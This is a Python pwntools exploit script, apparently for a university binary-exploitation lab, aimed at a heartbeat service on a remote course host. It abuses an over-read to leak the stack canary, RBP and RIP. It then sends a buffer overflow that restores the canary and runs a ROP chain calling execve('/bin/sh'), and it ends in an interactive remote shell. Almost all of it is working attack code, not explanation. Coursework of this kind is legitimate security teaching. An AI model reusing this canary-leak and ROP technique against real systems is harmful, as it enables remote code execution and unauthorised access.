from pwn import *

# Set CPU context architecture
context.arch = "amd64"

print("***********************************************************************")
# Launch exploit process
#p = gdb.debug("./lab4-3.bin")          # run exploit against binary locally with process attached to gdb
#p = process("./lab4-3.bin")            # run exploit against binary locally without attacking the process to gdb
p = remote("csc748.hostbin.org", 7043) # run the exploit against a remote process
print("\n\n")

# Set memory leakage parameters
COOKIE_OFFSET = "1040:heart"            # Leak Cookie (1040)
RBP_OFFSET = "1048:heart"               # Leak Cookie + RBP (1040 + 8 = 1048)
RIP_OFFSET = "1056:heart"               # Leak Cookie + RBP + RIP ( 1040 + 8 + 8 = 1056)
CLOSE_LEAK = "0:heart"                  # Exit the process to stop the keakage

# Receive and print output
response = p.recvuntil("\nWaiting for heart beat request...\n") 
print(response)
print("\n***********************************************************************")

# Send payload
p.sendline(RIP_OFFSET)
print("\n")

# Receive and print out
response = p.recvuntil("\nWaiting for heart beat request...\n")
payloadRequest = response
print("\n***************************ALL LEAKED MOMORY BYTES*********************")
print(hex(unpack(response, 'all')))

# Trim the bytes the tranlaste to output "Sending heart beat response...\n", the bytes come after the RIP bytes
response = response[:1087]
print("\n**************************SUFFIX BYTES TRIMMED*************************")
print(hex(unpack(response, 'all')))

# Trim all the bytes after the cookies
response = response[1063:]
print("\n**************************PREFIX BYTES TRIMMED*************************")
print(hex(unpack(response, 'all')))

# Extract and print out RIP
RIP = response[-8:]
print("\n***********************************************************************")
print("The byte values at RIP in hexadecimal are: ", hex(unpack(RIP, 'all')))

# Extract and print out RBP
RBP = response[8:16]
print("\n*********************************************************************")
print("The byte values at RBP in hexadecimal are: ", hex(unpack(RBP, 'all')))

# Extract and print out the stack cookie/canary
COOKIE = response[:8]
print("\n*********************************************************************")
print("The leaked cookie/canary byte values in hexadecimal are: ", hex(unpack(COOKIE, 'all')))

# Convert the leaked cookie to Base16 Integer for p64() payload input
COOKIE = hex(unpack(COOKIE, 'all'))
#print(COOKIE)
#print(type(COOKIE))
cookieBase16Int = int(COOKIE, 16)

print("\n**********************************************************************")
print("The leaked cookie/canary byte values as base 16 interger value are: ", cookieBase16Int)

print("\n***************************SENDING EXPLOIT PAYLOAD*********************\n")
#print(hex(unpack(payloadRequest[:31], 'all')))
#print(str((payloadRequest[:31]), encoding='utf-8'))

# Padding bytes to overflow target buffer up to including RBP
payload = (b"-1:")              # initial payload variable                     
payload += (b"/bin/sh\x00")     # RSI will point to this string just before ROP execution
payload += (b"B"*8)
payload += (b"C"*8)                         
payload += (b"D"*8)                         
payload += (b"E"*8)
payload += (b"F"*8)
payload += (b"G"*8)                         
payload += (b"H"*8)                         
payload += (b"I"*8)  
payload += (b"J"*8)
payload += (b"K"*8)                         
payload += (b"L"*8)                         
payload += (b"M"*8) 
payload += (b"N"*8)
payload += (b"O"*8)                         
payload += (b"P"*8)                         
payload += (b"Q"*8)  
payload += (b"R"*8)
payload += (b"S"*8) 
payload += (b"T"*8)                         
payload += (b"U"*8) 
payload += (b"V"*8)                         
payload += (b"W"*8)                         
payload += (b"X"*8)
payload += (b"Y"*210)                        
payload += (b"Z"*630)
payload += p64(cookieBase16Int)   # Put leaked cookie/canary back in the cookie jas
payload += (b"A"*8)               # RBP padding
# ROP Chain

"""
# VMMAP for location to write string to be referenced by RDI
0x00000000004df000 0x00000000004e2000 0x00000000000de000 rw- /home/xubuntu/Lab4/lab4-3.bin
0x00000000004e2000 0x00000000004e3000 0x0000000000000000 rw- 

# Gadgets
payload += p64(0x40101a)                    # NOP ret;
0x000000000048dc5e: mov rdi, rsi; bsr eax, eax; lea rax, [rdi + rax - 0x20]; vzeroupper; ret; 
0x0000000000451fd7 : pop rax ; ret;
0x00000000004018e2 : pop rdi ; ret;
0x00000000004017ef : pop rdx ; ret;
0x000000000040f30e : pop rsi ; ret;
"""
# Approach 3:
#payload += p64(0x40101a)      # NOP ret; for stack alignment
#payload += p64(0x40101a)      # NOP ret; for stack alignment
payload += p64(0x4018e2)      # pointer addres to ROP gadget "pop rdi; ret;"
payload += p64(0x4df000)      # a stable/unchanging destination address for "/bin/sh" string, binary for sys_execve() execute
payload += p64(0x48dc5e)      # # copy "/bin/sh" string in RSI to the destination address in RDI "mov rdi, rsi; bsr eax, eax; lea rax, [rdi + rax - 0x20]; vzeroupper; ret;" 
#payload += p64(0x40101a)      # NOP ret; for stack alignment
payload += p64(0x451fd7)      # pointer address to ROP gadget "pop rax; ret;" to pop 59 to RAX
payload += p64(59)            # Call number for sys_execev()
payload += p64(0x40f30e)      # pointer address to ROP gadget "pop rsi; ret;" to pop 0 to rsi
payload += p64(0)             # No arguements passed to sys_execve()
payload += p64(0x4017ef)      # pointer address to ROP gadget "pop rdx; ret;" to pop 0 to rdx
payload += p64(0)             # No environment variables passed to sys_execve()
payload += p64(0x4012e3)      # sycall to execute the sys_execve() functinon

# Send payload
p.sendline(payload)

# Switch to interactive
p. interactive()
